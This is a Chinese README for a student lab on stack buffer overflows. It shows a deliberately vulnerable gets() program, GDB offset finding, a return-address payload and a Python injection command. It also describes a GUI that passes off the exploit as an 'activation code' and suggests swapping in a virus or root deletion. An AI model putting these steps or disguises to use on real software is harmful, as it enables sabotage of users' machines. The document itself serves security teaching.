缓冲区溢出实验
项目简介：本仓库是一个用于学习和演示栈缓冲区溢出（Stack Buffer Overflow）攻击原理的实验项目。通过一个有意的漏洞程序，演示如何通过溢出栈上的缓冲区来覆盖函数返回地址，劫持程序控制流，并跳转到任意指定函数。

除了《实验报告》为严谨的、符合学术风格的论文外，其余内容可视为学习笔记，重在突显过程性，记录了处理问题的步骤……


项目背景
在学习软件安全的过程中，理解底层漏洞是至关重要的。本项目以一个极简的 C 程序为载体，演示经典的栈溢出 + 返回地址覆写攻击手法。配套一个 Python（Tkinter）图形界面程序，用于直观展示攻击流程。
⚠️ 仅供学习研究使用，请勿用于非法用途。


📂 项目结构
├── fake.c           # 含漏洞的 C 源代码（核心）
├── fake.exe         # 编译后的可执行程序
├── abspath.py       # Python Tkinter GUI 前端程序
├── abspath.exe      # Python 打包后的可执行文件（经过包装后的“安全”程序）
├── address.txt      # GDB 反汇编记录 — 各函数的入口地址
├── tiaoshi.txt      # 调试与测试过程记录
├── payload.txt      # 构造的 Payload 示例（十六进制格式）
├── 实验报告.doc      # 课程设计实验报告（Word 文档）
└── README.md        # 本文件


漏洞程序（fake.c）
核心是一个使用 gets() 的缓冲区溢出漏洞：
int main() {
    char buffer[16];
    gets(buffer);          // ⚠️ 不检查输入长度
    return 0;
}

可跳转的目标函数
函数名                | 地址（调试环境）     | 行为
trick()              | 0x00401460         | 打印提示（良性）
reboot()             | 0x00401475         | 重启计算机
colse()              | 0x0040148d         | 关闭计算机
download_chaoxing()  | 0x004014a5         | 下载学习通安装包（可进一步换为病毒软件）
uninstall_chaoxing() | 0x004014e9         | 卸载学习通（可进一步换为删除根目录？）

攻击原理与步骤
1️⃣ 确定溢出偏移量
输入 30 个 a → EIP = 0x00616161（"aaa"） 输入 29 个 a + "bcd" → EIP = 0x64636261（"abcd"） → 确定填充大小为 28 字节，第 29~32 字节就是返回地址。

2️⃣ 获取目标函数地址
(gdb) disassemble reboot
   0x00401475 <+0>:     push   %ebp

3️⃣ 构造 Payload
[28 字节填充] + [4 字节目标地址（小端序）]
例如跳转 reboot（0x00401475）：
1234567890123456789012345678 + \x75\x14\x40\x00

4️⃣ 注入 Payload
python -c "import sys; sys.stdout.buffer.write(bytes.fromhex('123456789012345678901234567875144000'))" | .\fake.exe


Python GUI（abspath.py）
Tkinter 图形界面，将攻击流程包装为一个"软件激活码"的交互场景：输入十六进制激活码 → 调用底层 fake.exe 执行溢出。


编译与使用
# 编译 C 程序
gcc fake.c -o fake.exe -static

# GDB 调试
gdb fake.exe

# 运行 GUI
python abspath.py


 安全建议
• 永远不要使用 gets()，改用 fgets()
• 启用 ASLR、DEP/NX、栈保护等编译选项
• 不要以管理员权限运行来路不明的程序
